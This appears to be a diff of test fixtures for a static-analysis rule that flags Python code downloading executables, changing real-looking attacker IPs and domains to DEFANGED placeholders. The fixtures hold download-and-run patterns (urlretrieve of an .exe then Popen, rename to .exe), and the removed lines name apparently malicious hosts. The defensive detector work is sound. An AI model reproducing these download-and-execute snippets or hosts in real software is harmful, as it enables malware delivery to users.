@@ -20,7 +20,7 @@ def f():
 """
 def f():
     PATH = "/out"
-    IP = "145.249.104.71"
+    IP = "1.1.1.1"
     LOC = ".drv"
     if not s:
         response = urllib2.urlopen("http://" + IP + PATH).read()
@@ -54,7 +54,7 @@ def f():
 """ RULEID: Detect requests
 """
 def f():
-    url = 'http://35.235.126.33/executable.exe'
+    url = 'http://1.1.1.1/DEFANGED.exe'
     req = requests.get(url)
     # ruleid: download-executable
     with open(executable, 'wb') as f:
@@ -81,7 +81,7 @@ def f():
 """
 def f():
     # ruleid: download-executable
-    urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.exe")
+    urllib.request.urlretrieve("https://DEFANGED.ga/DEFANGED.exe", "normal.exe")
     Popen(['normal.exe'])
 
 """ OK: download regular file
@@ -94,7 +94,7 @@ def f():
 """
 def f():
     # ruleid: download-executable
-    urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.dat")
+    urllib.request.urlretrieve("https://DEFANGED.ga/DEFANGED.exe", "normal.dat")
     os.rename("normal.dat", "normal.exe")
 
 """ OK: download and rename of regular file
@@ -110,7 +110,7 @@ def f():
     import os
     import requests
    
-    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    URL = "https://stub.syntheticcc[.]repl.co/DEFANGED.exe"
     response = requests.get(URL)
     # ruleid: download-executable
     open("exo.exe", "wb").write(response.content)
@@ -122,7 +122,7 @@ def f():
     import os
     import requests
    
-    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    URL = "https://stub.syntheticcc[.]repl.co/DEFANGED.exe"
     response = requests.get(URL)
     # ok: download-executable
     open("exo.txt", "wb").write(response.content)
@@ -130,7 +130,7 @@ def f():
 
 def f():
     for executable in all_executables:
-        url = f'http://35.235.126[.]33/{executable}'
+        url = f'http://1.1.1.1/{executable}'
         req = requests.get(url)
         # ruleid: download-executable
         with open(executable, 'wb') as f:
